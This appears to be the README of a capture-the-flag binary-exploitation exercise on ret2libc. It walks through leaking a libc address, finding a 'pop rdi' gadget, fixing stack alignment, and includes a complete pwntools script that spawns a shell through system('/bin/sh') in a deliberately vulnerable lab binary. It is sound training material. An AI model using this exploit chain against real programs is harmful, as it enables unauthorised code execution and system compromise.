@@ -1,0 +1,152 @@
+================================================================================
+CHALLENGE 05: RETURN TO LIBC (RET2LIBC)
+================================================================================
+Difficulty : [★★★★☆] Hard
+Category   : Binary Exploitation (pwn) / ret2libc & Multi-Stage Chaining
+Directory  : House_of_Calls/
+================================================================================
+
+[1. OVERVIEW]
+--------------------------------------------------------------------------------
+In previous challenges, there was always a convenient helper function (`win()`) 
+baked into the binary waiting for you to call it.
+
+In real-world software, developers never provide a `win()` function.
+
+However, almost every compiled C program links against `libc` (the standard C 
+library). Inside `libc`, there are thousands of powerful functions—including 
+`system()`, `execve()`, and even pre-existing strings like `"/bin/sh"`.
+
+In this challenge, you will combine all the techniques you have mastered:
+  • Stack buffer overflow
+  • RIP hijacking
+  • ASLR bypass via address leak
+  • ROP argument passing via `pop rdi`
+  • Spawning an interactive shell using standard C library functions (`ret2libc`)
+
+
+[2. CHALLENGE DESCRIPTION]
+--------------------------------------------------------------------------------
+"No win function in sight. Only the vast halls of libc. Can you make the 
+ right calls to seize the shell?"
+
+Binary characteristics:
+  • Buffer overflow vulnerability (e.g. `read()` or `gets()` into a fixed stack buffer)
+  • No stack canary
+  • NX enabled (stack is not executable)
+  • ASLR enabled
+  • An information leak exposing a libc function pointer (or GOT entry)
+  • NO `win()` function!
+
+Your goal:
+Leak a libc address, calculate libc base, and execute:
+    system("/bin/sh")
+
+
+[3. THE EXPLOITATION CHAIN]
+--------------------------------------------------------------------------------
+The full attack unfolds in logical phases:
+
+       [Buffer Overflow]
+              ↓
+       [Overwriting RIP]
+              ↓
+    [Parse Libc Leak Pointer]
+              ↓
+    [Calculate Libc Base Address]
+              ↓
+  [Locate system() and "/bin/sh"]
+              ↓
+   [Craft ROP Chain: pop rdi]
+              ↓
+      [system("/bin/sh")]
+              ↓
+       [INTERACTIVE SHELL]
+
+
+[4. TECHNICAL DETAILS & STEP-BY-STEP RECIPE]
+--------------------------------------------------------------------------------
+1. Calculate the libc base:
+   From Challenge 04, you know:
+       libc_base = leaked_libc_address - libc.symbols['leaked_function']
+
+2. Locate targets in libc:
+   Using pwntools ELF object:
+       libc.address = libc_base
+       system_addr  = libc.symbols['system']
+       binsh_addr   = next(libc.search(b'/bin/sh\x00'))
+
+3. Find the `pop rdi ; ret` gadget:
+   You can use a gadget from the binary (if PIE is off) or from libc itself:
+       pop_rdi = libc_base + offset_of_pop_rdi
+
+4. Handle 64-bit Stack Alignment (Crucial!):
+   On 64-bit Linux (glibc 2.27+), `system()` calls SIMD instructions (like `movaps`) 
+   which require the stack pointer (`$rsp`) to be an exact multiple of 16 bytes 
+   when entering `system()`.
+   If your exploit crashes inside `do_system` or `movaps`, insert an extra `ret` 
+   gadget immediately before calling `system` to align `$rsp` by 8 bytes!
+
+5. Assemble the Final ROP Chain:
+   Payload structure:
+     • [Padding to saved RIP] (e.g., 72 bytes)
+     • [pop rdi ; ret gadget address]
+     • [address of "/bin/sh"]
+     • [extra ret gadget address (for 16-byte stack alignment)]
+     • [address of system()]
+
+
+[5. PWNTOOLS SCRIPT BLUEPRINT]
+--------------------------------------------------------------------------------
+  from pwn import *
+
+  elf = ELF('./chall')
+  libc = ELF('./libc.so.6') # Or local libc
+  p = process('./chall')
+
+  # 1. Receive leak
+  p.recvuntil(b"Leak: ")
+  leak = int(p.recvline().strip(), 16)
+  
+  # 2. Compute base
+  libc.address = leak - libc.symbols['puts'] # or leaked function
+  log.success(f"Libc Base: {hex(libc.address)}")
+
+  # 3. Gadgets
+  rop = ROP([elf, libc])
+  pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+  ret_gadget = rop.find_gadget(['ret'])[0]
+
+  # 4. Construct payload
+  payload  = b"A" * 72
+  payload += p64(ret_gadget)                 # Stack alignment
+  payload += p64(pop_rdi)
+  payload += p64(next(libc.search(b"/bin/sh\x00")))
+  payload += p64(libc.symbols['system'])
+
+  # 5. Send & win
+  p.sendline(payload)
+  p.interactive()
+
+
+[6. CONCEPTS LEARNED]
+--------------------------------------------------------------------------------
+• ret2libc Architecture       : Exploiting binaries by redirecting flow to shared libraries.
+• libc Base Resolution        : Dynamically rebasing libc symbols at runtime.
+• String Hunting              : Locating pre-existing strings (`/bin/sh`) inside libraries.
+• 16-Byte Stack Alignment     : Troubleshooting `movaps` alignment crashes on x86-64.
+• Multi-Stage Chaining        : Combining leak + calculation + gadget orchestration.
+
+
+[7. PROGRESSIVE HINTS]
+--------------------------------------------------------------------------------
+Hint 1: There is no `win()` function. Where else on the system can you find a function 
+        that executes commands? Check `libc.so.6`.
+
+Hint 2: Libc contains not just functions, but strings! Did you know that the exact string 
+        `"/bin/sh"` already exists inside libc? You don't even need to provide it yourself.
+
+Hint 3: Is your script reaching `system()` but crashing on a `movaps` instruction? 
+        The stack is misaligned! Add a simple `ret` gadget before `pop rdi` to align the 
+        stack to a 16-byte boundary.
+================================================================================
